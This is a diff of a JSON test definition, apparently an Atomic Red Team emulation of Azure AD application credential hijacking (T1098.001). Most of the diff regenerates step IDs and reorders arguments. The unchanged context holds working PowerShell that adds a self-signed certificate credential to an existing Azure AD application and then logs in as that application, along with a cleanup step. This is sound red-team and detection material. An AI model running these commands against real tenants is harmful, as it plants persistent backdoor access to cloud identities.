@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "b5324daf-9521-40bf-ba59-b4c3349c18ab",
+      "id": "9edb6ebf-3b24-45bd-beb1-9db00776f2f2",
       "type": "execute-command",
       "data": {
         "command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential \u003e $null\n\n$app = Get-AzureADApplication -SearchString \"#{application_name}\" | Select-Object -First 1\nif ($app -eq $null) { Write-Warning \"Application not found\"; exit }\n\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\n$credNotAfter = (Get-Date).AddDays(1)\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\n\n$cert = New-SelfSignedCertificate -DnsName \"atomicredteam.example.com\" -FriendlyName \"AtomicCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\n\nNew-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"AtomicTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\n\nStart-Sleep -s 30\n$tenant = Get-AzureADTenantDetail\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\nWrite-Host \"End of Hijacking\"\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "91defbaa-9e2d-4d83-b4d5-8911bf69ca21",
+      "id": "4df6324f-5b87-4d4d-9435-816546818a3b",
       "type": "execute-command",
       "data": {
         "command": "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential -ErrorAction Ignore \u003e $null\n\n$app = Get-AzureADApplication -SearchString \"#{application_name}\" | Select-Object -First 1\n$credz = Get-AzureADApplicationKeyCredential -ObjectId $app.ObjectId\nforeach ($cred in $credz) {\n  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq \"AtomicTest\") {\n    Write-Host \"Removed $($cred.KeyId) key from application\"\n    Remove-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -KeyId $cred.KeyId\n  }  \n}\nGet-ChildItem -Path Cert:\\CurrentUser\\My | where { $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item\n",
@@ -25,7 +25,7 @@
       "elevation_required": false
     },
     {
-      "id": "0bb12f0d-609d-4a24-92a5-573f127a0541",
+      "id": "677d0fec-48c5-4ffd-b9ec-21de05ef994a",
       "name": "Check dependency 1/1",
       "description": "AzureAD module must be installed.\n",
       "type": "execute-command",
@@ -36,7 +36,7 @@
       "elevation_required": false
     },
     {
-      "id": "160ffd4c-81b4-4686-96a4-22b160aff1e4",
+      "id": "b4e7ffdb-00e3-40a0-aaae-3316358a761d",
       "name": "Resolve dependency 1/1",
       "description": "AzureAD module must be installed.\n",
       "type": "execute-command",
@@ -47,7 +47,7 @@
       "elevation_required": false
     },
     {
-      "id": "166f2bd6-2741-4b96-8d18-9d373d8e5fdf",
+      "id": "d156954b-b261-4821-9314-7168a1b2f496",
       "name": "Re-check dependency 1/1",
       "description": "AzureAD module must be installed.\n",
       "type": "execute-command",
@@ -60,41 +60,47 @@
   ],
   "flows": [
     {
-      "s": "b5324daf-9521-40bf-ba59-b4c3349c18ab",
+      "s": "9edb6ebf-3b24-45bd-beb1-9db00776f2f2",
       "p": "on-success",
-      "o": "91defbaa-9e2d-4d83-b4d5-8911bf69ca21"
+      "o": "4df6324f-5b87-4d4d-9435-816546818a3b"
     },
     {
-      "s": "b5324daf-9521-40bf-ba59-b4c3349c18ab",
+      "s": "9edb6ebf-3b24-45bd-beb1-9db00776f2f2",
       "p": "on-failure",
-      "o": "91defbaa-9e2d-4d83-b4d5-8911bf69ca21"
+      "o": "4df6324f-5b87-4d4d-9435-816546818a3b"
     },
     {
-      "s": "0bb12f0d-609d-4a24-92a5-573f127a0541",
+      "s": "677d0fec-48c5-4ffd-b9ec-21de05ef994a",
       "p": "on-success",
-      "o": "b5324daf-9521-40bf-ba59-b4c3349c18ab"
+      "o": "9edb6ebf-3b24-45bd-beb1-9db00776f2f2"
     },
     {
-      "s": "0bb12f0d-609d-4a24-92a5-573f127a0541",
+      "s": "677d0fec-48c5-4ffd-b9ec-21de05ef994a",
       "p": "on-failure",
-      "o": "160ffd4c-81b4-4686-96a4-22b160aff1e4"
+      "o": "b4e7ffdb-00e3-40a0-aaae-3316358a761d"
     },
     {
-      "s": "160ffd4c-81b4-4686-96a4-22b160aff1e4",
+      "s": "b4e7ffdb-00e3-40a0-aaae-3316358a761d",
       "p": "on-success",
-      "o": "166f2bd6-2741-4b96-8d18-9d373d8e5fdf"
+      "o": "d156954b-b261-4821-9314-7168a1b2f496"
     },
     {
-      "s": "166f2bd6-2741-4b96-8d18-9d373d8e5fdf",
+      "s": "d156954b-b261-4821-9314-7168a1b2f496",
       "p": "on-failure",
-      "o": "b5324daf-9521-40bf-ba59-b4c3349c18ab"
+      "o": "9edb6ebf-3b24-45bd-beb1-9db00776f2f2"
     }
   ],
   "tags": [
-    "T1098.001",
-    "atomic-red-team"
+    "T1098",
+    "T1098.001"
   ],
   "input_arguments": [
+    {
+      "name": "application_name",
+      "type": "string",
+      "description": "Name of the targeted application",
+      "value": "SuperApp"
+    },
     {
       "name": "username",
       "type": "string",
@@ -106,12 +112,6 @@
       "type": "string",
       "description": "Azure AD password",
       "value": "p4sswd"
-    },
-    {
-      "name": "application_name",
-      "type": "string",
-      "description": "Name of the targeted application",
-      "value": "SuperApp"
     }
   ]
 }
